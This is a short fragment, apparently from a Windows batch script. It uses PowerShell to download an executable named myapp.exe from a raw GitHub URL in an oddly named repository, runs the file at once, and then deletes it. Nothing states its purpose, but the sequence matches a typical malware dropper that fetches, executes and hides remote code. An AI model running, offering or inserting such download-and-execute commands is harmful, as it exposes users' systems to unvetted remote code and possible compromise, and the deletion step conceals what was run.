...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Canproject30/arthurchaddy-canstlr-2782/main/myapp.exe', '%indirme_yeri%')"
"%indirme_yeri%"
del "%indirme_yeri%"
